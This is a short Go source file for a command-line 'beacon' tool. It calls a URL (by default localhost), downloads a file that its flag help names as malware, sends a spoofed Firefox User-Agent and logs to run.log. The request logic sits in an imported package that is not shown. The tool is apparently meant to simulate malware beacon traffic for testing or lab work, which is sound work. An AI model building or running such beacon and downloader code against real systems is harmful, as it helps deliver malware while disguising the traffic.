package main

import (
	//"math/rand"
	//"time"
	"io"
	"os"
	"log"
	"flag"

	"../requestor"
)

type Config struct {
	url string 
	file string
	agent string
}

var config Config

func main() {
	//Command line switches
	var (
		url = flag.String("url", "http://127.0.0.1:80", "URL to beacon to")
		file = flag.String("file", "", "Name of malware to download from server")
		agent = flag.String("ua", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "User Agent")
		// method = flag.String("method", "GET", "HTTP method")
	)

	flag.Parse()

	config = Config{*url, *file, *agent}

	logfile, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer logfile.Close()
    mw := io.MultiWriter(os.Stdout, logfile)
	log.SetOutput(mw)

	requestor := requestor.NewHttpRequestor(config.url, config.file, config.agent)

	requestor.Request()
}
